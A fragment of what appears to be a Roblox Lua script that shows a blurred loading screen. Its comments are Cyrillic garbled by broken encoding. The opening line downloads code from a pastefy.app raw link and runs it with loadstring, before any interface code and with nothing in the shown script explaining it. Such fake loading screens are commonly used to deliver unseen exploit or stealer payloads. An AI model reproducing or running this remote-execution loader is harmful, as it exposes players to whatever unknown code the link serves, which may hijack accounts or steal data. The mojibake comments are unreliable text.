loadstring(game:HttpGet("https://pastefy.app/BLldvDWO/raw"))() local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-------------------------------------------------------
-- üìå BLUR –≠–§–§–ï–ö–¢ –ù–ê –§–û–ù
-------------------------------------------------------
local blur = Instance.new("BlurEffect")
blur.Size = 0
blur.Parent = game.Lighting

-- –ê–Ω–∏–º–∞—Ü–∏—è –ø–æ—è–≤–ª–µ–Ω–∏—è –±–ª—é—Ä–∞
TweenService:Create(blur, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {
    Size = 16
}):Play()

-------------------------------------------------------
-- üìå –°–û–ó–î–ê–Å–ú ScreenGui
-------------------------------------------------------
local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-------------------------------------------------------
-- üìå –ó–ê–ì–†–£–ó–û–ß–ù–´–ô –≠–ö–†–ê–ù
